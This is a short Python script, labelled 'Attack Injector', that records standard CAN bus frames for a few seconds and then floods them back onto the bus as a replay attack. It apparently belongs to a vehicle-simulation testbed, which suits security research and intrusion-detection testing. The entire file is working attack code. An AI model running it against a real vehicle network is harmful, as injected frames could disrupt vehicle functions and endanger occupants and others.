import time
import can
import os
import sys

sys.path.append(os.path.join(os.path.dirname(__file__), "..", "vehicle-sim"))
from can_bus_utils import get_can_bus

def run_replay_attack(duration=5, capture_window=2.0):
    """Captures valid traffic window and replays it back rapidly onto the bus."""
    bus = get_can_bus()
    print(f"[Attack Injector] Capturing CAN traffic for replay attack ({capture_window}s)...")
    captured_messages = []
    
    start_c = time.time()
    while time.time() - start_c < capture_window:
        msg = bus.recv(timeout=0.1)
        if msg and not msg.is_extended_id:
            captured_messages.append(msg)
            
    print(f"[Attack Injector] Captured {len(captured_messages)} frames. Launching Replay Attack for {duration}s...")
    if not captured_messages:
        print("[Attack Injector Warning] No traffic captured for replay.")
        return 0
        
    start_r = time.time()
    count = 0
    while time.time() - start_r < duration:
        for orig_msg in captured_messages:
            replay_msg = can.Message(
                arbitration_id=orig_msg.arbitration_id,
                data=orig_msg.data,
                is_extended_id=False
            )
            try:
                bus.send(replay_msg)
                count += 1
            except Exception:
                pass
            time.sleep(0.002)
            if time.time() - start_r >= duration:
                break

    print(f"[Attack Injector] Replay Attack completed. Replayed {count} frames.")
    return count

if __name__ == "__main__":
    dur = float(sys.argv[1]) if len(sys.argv) > 1 else 5.0
    run_replay_attack(duration=dur)
